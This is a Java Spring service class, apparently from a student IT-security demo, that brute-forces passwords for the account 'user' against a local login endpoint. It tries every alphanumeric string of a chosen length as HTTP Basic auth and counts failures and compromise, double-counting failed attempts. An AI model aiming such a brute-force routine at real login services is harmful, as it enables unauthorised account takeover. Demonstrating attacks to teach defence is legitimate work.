package com.java22d.itsakerhet.Services;

import com.java22d.itsakerhet.DTO.BruteForceStatistics;
import lombok.Data;
import org.springframework.http.*;
import org.springframework.stereotype.Service;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import java.util.Base64;

@Service
@Data
public class BruteForceService {
    private boolean isBruteForcing;
    private boolean userCompromised;
    private int failedAttempts;
    private static final String CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    public void startBruteForce(int len) {
        this.failedAttempts = 0;
        this.isBruteForcing = true;
        System.out.println("Testing all passwords of length" + len);

        bruteForce(len, "");
    }

    public boolean bruteForce(int len, String current) {
        if (!isBruteForcing) return false;

        if (len == 0) {
            this.failedAttempts++;


            if (postUsingRestTemplate("user", current)) {

                System.out.println("Password cracked: " + current);

                this.userCompromised = true;

                return true;
            } else {
                failedAttempts++;
            }
            return false;
        }

        for (int i = 0; i < CHARACTERS.length(); i++) {
            if(bruteForce(len - 1, current + CHARACTERS.charAt(i))) {
                return true;
            }
        }
        return false;
    }

    public boolean postUsingRestTemplate(String username, String password) {

        System.out.println("Using username: " + username + " and password: " + password);
        RestTemplate restTemplate = new RestTemplate();
        String url = "http://localhost:8080/login/";
        //System.out.println("DEBUG: Använder username: " + username + " och password: " + password);
        HttpHeaders headers = new HttpHeaders();

        // Enkodar till basic auth. Ska vi köra json behöver vi göra en ny validering av användaren.
        String authValue = "Basic " + Base64.getEncoder().encodeToString((username + ":" + password).getBytes());
        headers.set("Authorization", authValue);

        HttpEntity<String> entity = new HttpEntity<>(headers);

        ResponseEntity<String> response;
        try {
            response = restTemplate.exchange(url, HttpMethod.POST, entity, String.class);
        } catch (HttpClientErrorException e) {
            System.out.println("Response Status: " + e.getStatusCode());
            System.out.println("Login failed due to client error"); // Debugging comment
            return false; // Login failed due to client error (likely unauthorized)
        }

        System.out.println("Response Status: " + response.getStatusCode());
        System.out.println("Response Body: " + response.getBody());

        if ("Logged in".equals(response.getBody())) {
            System.out.println("Successful login attempt with password: " + password); // Debugging comment
            return true; // Successful login
        } else {
            System.out.println("Failed login attempt with password: " + password); // Debugging comment
            return false; // Login failed
        }
    }

    public BruteForceStatistics getBruteForceStatistics() {
        BruteForceStatistics statistics = new BruteForceStatistics();
        // Populate statistics with data from your service
        statistics.setFailedAttempts(getFailedAttempts());
        statistics.setUserCompromised(isUserCompromised());

        //prints out the statistics
        System.out.println("Failed attempts: " + statistics.getFailedAttempts());
        System.out.println("User compromised: " + statistics.isUserCompromised());

        return statistics;
    }
}




